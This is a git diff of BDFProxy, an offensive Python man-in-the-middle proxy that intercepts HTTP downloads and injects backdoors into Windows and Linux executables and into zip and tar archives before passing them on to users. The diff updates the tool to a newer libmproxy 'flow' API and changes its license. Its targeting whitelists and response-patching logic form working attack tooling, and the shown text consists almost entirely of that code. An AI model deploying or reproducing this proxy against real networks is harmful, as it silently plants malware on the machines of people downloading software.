@@ -1,36 +1,44 @@
 #!/usr/bin/env python
 """
-    BackdoorFactory Proxy (BDFProxy) v0.1 - 'Indifferent Pronoun'
+    BackdoorFactory Proxy (BDFProxy) v0.2 - 'Something Something'
 
     Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
 
-    Copyright (C) 2013,2014, Joshua Pitts
+    Copyright (c) 2013-2014, Joshua Pitts
+    All rights reserved.
 
-    License:   GPLv3
+    Redistribution and use in source and binary forms, with or without modification,
+    are permitted provided that the following conditions are met:
 
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
+        1. Redistributions of source code must retain the above copyright notice,
+        this list of conditions and the following disclaimer.
 
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
+        2. Redistributions in binary form must reproduce the above copyright notice,
+        this list of conditions and the following disclaimer in the documentation
+        and/or other materials provided with the distribution.
 
-    See <http://www.gnu.org/licenses/> for a copy of the GNU General
-    Public License
+        3. Neither the name of the copyright holder nor the names of its contributors
+        may be used to endorse or promote products derived from this software without
+        specific prior written permission.
 
-    Currently supports win86/64 PE and linux86/64 ELF only(intel architecture).
-    This program is to be used for only legal activities by IT security
-    professionals and researchers. Author not responsible for malicious
-    uses.
+    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+    POSSIBILITY OF SUCH DAMAGE.
 
     Tested on Kali-Linux.
 
 """
 
 from libmproxy import controller, proxy, platform
+from libmproxy.proxy.server import ProxyServer
 from tempfile import mkstemp
 import os
 from bdf import pebin
@@ -472,36 +480,36 @@ class proxyMaster(controller.Master):
             logging.warning("EXCEPTION IN binaryGrinder %s", str(e))
             return None
 
-    def hosts_whitelist_check(self, msg):
+    def hosts_whitelist_check(self, flow):
         if self.hostwhitelist.lower() == 'all':
             self.patchIT = True
 
         elif type(self.hostwhitelist) is str:
-            if self.hostwhitelist.lower() in msg.request.host.lower():
+            if self.hostwhitelist.lower() in flow.request.host.lower():
                 self.patchIT = True
-                logging.info("Host whitelist hit: %s, HOST: %s, IP: %s",
+                logging.info("Host whitelist hit: %s, HOST: %s ",
                              str(self.hostwhitelist),
-                             str(msg.request.host),
-                             str(msg.request.ip))
+                             str(flow.request.host),
+                           )
 
-        elif msg.request.host.lower() in self.hostwhitelist.lower() or msg.request.ip in self.hostwhitelist:
+        elif flow.request.host.lower() in self.hostwhitelist.lower(): 
             self.patchIT = True
-            logging.info("Host whitelist hit: %s, HOST: %s, IP: %s",
+            logging.info("Host whitelist hit: %s, HOST: %s ",
                          str(self.hostwhitelist),
-                         str(msg.request.host),
-                         str(msg.request.ip))
+                         str(flow.request.host),
+                       )
 
         else:
             for keyword in self.hostwhitelist:
-                if keyword.lower() in msg.requeset.host.lower():
+                if keyword.lower() in flow.requeset.host.lower():
                     self.patchIT = True
-                    logging.info("Host whitelist hit: %s, HOST: %s IP: %s",
+                    logging.info("Host whitelist hit: %s, HOST: %s ",
                                  str(self.hostwhitelist),
-                                 str(msg.request.host),
-                                 str(msg.request.ip))
+                                 str(flow.request.host),
+                               )
                     break
 
-    def keys_whitelist_check(self, msg):
+    def keys_whitelist_check(self, flow):
         #Host whitelist check takes precedence
         if self.patchIT is False:
             return None
@@ -510,60 +518,60 @@ class proxyMaster(controller.Master):
             self.patchIT = True
 
         elif type(self.keyswhitelist) is str:
-            if self.keyswhitelist.lower() in msg.request.path.lower() or msg.request.ip == self.keyswhitelist:
+            if self.keyswhitelist.lower() in flow.request.path.lower(): 
                 self.patchIT = True
                 logging.info("Keyword whitelist hit: %s, PATH: %s",
-                             str(self.keyswhitelist), str(msg.request.path))
+                             str(self.keyswhitelist), str(flow.request.path))
 
-        elif msg.request.host.lower() in [x.lower() for x in self.keyswhitelist] or msg.request.ip in self.keyswhitelist:
+        elif flow.request.host.lower() in [x.lower() for x in self.keyswhitelist]: 
             self.patchIT = True
             logging.info("Keyword whitelist hit: %s, PATH: %s",
-                         str(self.keyswhitelist), str(msg.request.path))
+                         str(self.keyswhitelist), str(flow.request.path))
 
         else:
 
             for keyword in self.keyswhitelist:
-                if keyword.lower() in msg.requeset.path.lower():
+                if keyword.lower() in flow.requeset.path.lower():
                     self.patchIT = True
                     logging.info("Keyword whitelist hit: %s, PATH: %s",
-                                 str(self.keyswhitelist), str(msg.request.path))
+                                 str(self.keyswhitelist), str(flow.request.path))
                     break
 
-    def keys_backlist_check(self, msg):
+    def keys_backlist_check(self, flow):
         if type(self.keysblacklist) is str:
 
-            if self.keysblacklist.lower() in msg.request.path.lower():
+            if self.keysblacklist.lower() in flow.request.path.lower():
                 self.patchIT = False
                 logging.info("Keyword blacklist hit: %s, PATH: %s",
-                             str(self.keysblacklist), str(msg.request.path))
+                             str(self.keysblacklist), str(flow.request.path))
 
         else:
             for keyword in self.keysblacklist:
-                if keyword.lower() in msg.request.path.lower():
+                if keyword.lower() in flow.request.path.lower():
                     self.patchIT = False
                     logging.info("Keyword blacklist hit: %s, PATH: %s",
-                                 str(self.keysblacklist), str(msg.request.path))
+                                 str(self.keysblacklist), str(flow.request.path))
                     break
 
-    def hosts_blacklist_check(self, msg):
+    def hosts_blacklist_check(self, flow):
         if type(self.hostblacklist) is str:
 
-            if self.hostblacklist.lower() in msg.request.host.lower() or msg.request.ip == self.hostblacklist:
+            if self.hostblacklist.lower() in flow.request.host.lower(): 
                 self.patchIT = False
-                logging.info("Host Blacklist hit: %s : HOST: %s, IP: %s",
-                             str(self.hostblacklist), str(msg.request.host), str(msg.request.ip))
+                logging.info("Host Blacklist hit: %s : HOST: %s ",
+                             str(self.hostblacklist), str(flow.request.host))
 
-        elif msg.request.host.lower() in [x.lower() for x in self.hostblacklist] or msg.request.ip in self.hostblacklist:
+        elif flow.request.host.lower() in [x.lower() for x in self.hostblacklist]:
             self.patchIT = False
-            logging.info("Host Blacklist hit: %s : HOST: %s, IP: %s",
-                         str(self.hostblacklist), str(msg.request.host), str(msg.request.ip))
+            logging.info("Host Blacklist hit: %s : HOST: %s ",
+                         str(self.hostblacklist), str(flow.request.host))
 
         else:
             for host in self.hostblacklist:
-                if host.lower() in msg.request.host.lower():
+                if host.lower() in flow.request.host.lower():
                     self.patchIT = False
-                    logging.info("Host Blacklist hit: %s : HOST: %s, IP: %s",
-                                 str(self.hostblacklist), str(msg.request.host), str(msg.request.ip))
+                    logging.info("Host Blacklist hit: %s : HOST: %s ",
+                                 str(self.hostblacklist), str(flow.request.host))
                     break
 
     def parse_target_config(self, targetConfig):
@@ -587,15 +595,16 @@ class proxyMaster(controller.Master):
                     setattr(self, key, value)
                     logging.debug("Updating Config %s: %s", key, value)
 
-    def handle_request(self, msg):
+    def handle_request(self, flow):
         print "*" * 10, "REQUEST", "*" * 10
-        print "[*] HOST: ", msg.host
-        print "[*] PATH: ", msg.path
-        msg.reply()
+        print "[*] HOST: ", flow.request.host
+        print "[*] PATH: ", flow.request.path
+        flow.reply()
         print "*" * 10, "END REQUEST", "*" * 10
 
-    def handle_response(self, msg):
+    def handle_response(self, flow):
         #Read config here for dynamic updating
+        
         try:
             self.userConfig = ConfigObj('bdfproxy.cfg')
             self.hostblacklist = self.userConfig['hosts']['blacklist']
@@ -609,7 +618,7 @@ class proxyMaster(controller.Master):
                 if target == 'ALL':
                     self.parse_target_config(self.userConfig['targets']['ALL'])
 
-                if target in msg.request.host or target == msg.request.ip:
+                if target in flow.request.host: 
                     self.parse_target_config(self.userConfig['targets'][target])
 
         except Exception as e:
@@ -618,8 +627,8 @@ class proxyMaster(controller.Master):
 
         print "=" * 10, "RESPONSE", "=" * 10
 
-        print "[*] HOST: ", msg.request.host
-        print "[*] PATH: ", msg.request.path
+        print "[*] HOST: ", flow.request.host
+        print "[*] PATH: ", flow.request.path
 
         # Below are gates from whitelist --> blacklist
         # Blacklists have the final say, but everything starts off as not patchable
@@ -627,35 +636,35 @@ class proxyMaster(controller.Master):
 
         self.patchIT = False
 
-        self.hosts_whitelist_check(msg)
+        self.hosts_whitelist_check(flow)
 
-        self.keys_whitelist_check(msg)
+        self.keys_whitelist_check(flow)
 
-        self.keys_backlist_check(msg)
+        self.keys_backlist_check(flow)
 
-        self.hosts_blacklist_check(msg)
+        self.hosts_blacklist_check(flow)
 
-        if 'content-length' in msg.headers.keys():
-            if int(msg.headers['content-length'][0]) >= long(self.FileSizeMax):
+        if 'content-length' in flow.request.headers.keys():
+            if int(flow.request.headers['content-length'][0]) >= long(self.FileSizeMax):
                 print "[!] Not patching over content-length, forwarding to user"
-                logging.info("Over FileSizeMax setting %s : %s", msg.request.host, msg.request.path)
+                logging.info("Over FileSizeMax setting %s : %s", flow.request.host, flow.request.path)
                 self.patchIT = False
 
         if self.patchIT is False:
-            print '[!] Not patching, msg did not make it through config settings'
+            print '[!] Not patching, flow did not make it through config settings'
             logging.info("Config did not allow the patching of HOST: %s, PATH: %s",
-                         msg.request.host, msg.request.path)
+                         flow.request.host, flow.request.path)
 
-            msg.reply()
+            flow.reply()
 
         else:
-            if self.bytes_have_format(msg.content, 'zip') and self.convert_to_Bool(self.CompressedFiles) is True:
-                    aZipFile = msg.content
-                    msg.content = self.zip_files(aZipFile)
+            if self.bytes_have_format(flow.reply.obj.response.content, 'zip') and self.convert_to_Bool(self.CompressedFiles) is True:
+                    aZipFile = flow.reply.obj.response.content
+                    flow.reply.obj.response.content = self.zip_files(aZipFile)
 
-            elif self.bytes_have_format(msg.content, 'pe') or self.bytes_have_format(msg.content, 'elf'):
+            elif self.bytes_have_format(flow.reply.obj.response.content, 'pe') or self.bytes_have_format(flow.reply.obj.response.content, 'elf'):
 
-                orgFile = msg.content
+                orgFile = flow.reply.obj.response.content
 
                 fd, tmpFile = mkstemp()
 
@@ -666,28 +675,28 @@ class proxyMaster(controller.Master):
 
                 if patchResult:
                     file2 = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
-                    msg.content = file2
+                    flow.reply.obj.response.content = file2
                     os.remove('./backdoored/' + os.path.basename(tmpFile))
                     print "[*] Patching complete, forwarding to user."
-                    logging.info("Patching complete for HOST: %s, PATH: %s", msg.request.host, msg.request.path)
+                    logging.info("Patching complete for HOST: %s, PATH: %s", flow.request.host, flow.request.path)
                 else:
                     print "[!] Patching failed"
-                    logging.info("Patching failed for HOST: %s, PATH: %s", msg.request.host, msg.request.path)
+                    logging.info("Patching failed for HOST: %s, PATH: %s", flow.request.host, flow.request.path)
 
                 os.close(fd)
 
                 os.remove(tmpFile)
 
-            elif self.bytes_have_format(msg.content, 'gz') and self.convert_to_Bool(self.CompressedFiles) is True:
+            elif self.bytes_have_format(flow.reply.obj.response.content, 'gz') and self.convert_to_Bool(self.CompressedFiles) is True:
                 # assume .tar.gz for now
-                msg.content = self.tar_files(msg.content, 'gz')
-            elif self.bytes_have_format(msg.content, 'bz') and self.convert_to_Bool(self.CompressedFiles) is True:
+                flow.reply.obj.response.content = self.tar_files(flow.reply.obj.response.content, 'gz')
+            elif self.bytes_have_format(flow.reply.obj.response.content, 'bz') and self.convert_to_Bool(self.CompressedFiles) is True:
                 # assume .tar.bz for now
-                msg.content = self.tar_files(msg.content, 'bz')
-            elif self.bytes_have_format(msg.content, 'tar') and self.convert_to_Bool(self.CompressedFiles) is True:
-                msg.content = self.tar_files(msg.content, 'tar')
+                flow.reply.obj.response.content = self.tar_files(flow.reply.obj.response.content, 'bz')
+            elif self.bytes_have_format(flow.reply.obj.response.content, 'tar') and self.convert_to_Bool(self.CompressedFiles) is True:
+                flow.reply.obj.response.content = self.tar_files(flow.reply.obj.response.content, 'tar')
 
-            msg.reply()
+            flow.reply()
 
         print "=" * 10, "END RESPONSE", "=" * 10
 
@@ -698,8 +707,9 @@ userConfig = ConfigObj('bdfproxy.cfg')
 #################### BEGIN OVERALL CONFIGS ############################
 #DOES NOT UPDATE ON THE FLY
 resourceScript = userConfig['Overall']['resourceScript']
-config = proxy.ProxyConfig(cacert=os.path.expanduser(userConfig['Overall']['certLocation']),
+config = proxy.ProxyConfig(clientcerts=os.path.expanduser(userConfig['Overall']['certLocation']),
                            body_size_limit=userConfig['Overall']['MaxSizeFileRequested'],
+                           port=int(userConfig['Overall']['proxyPort'])
                            )
 
 if userConfig['Overall']['transparentProxy'] == "True":
@@ -707,7 +717,7 @@ if userConfig['Overall']['transparentProxy'] == "True":
                                 'resolver': platform.resolver()
                                 }
 
-server = proxy.ProxyServer(config, int(userConfig['Overall']['proxyPort']))
+server = ProxyServer(config)
 
 numericLogLevel = getattr(logging, userConfig['Overall']['loglevel'].upper(), None)
 
@@ -737,7 +747,9 @@ except Exception as e:
 
 m = proxyMaster(server)
 print "[!] Starting BDFProxy"
+print "[!] Author: @midnite_runr | the[.]midnite).(runr<at>gmail|.|com"
 logging.info("################ Starting BDFProxy ################")
+
 logging.info("[!] ConfigDump %s", json.dumps(userConfig, sort_keys=True, indent=4))
 
 m.run()
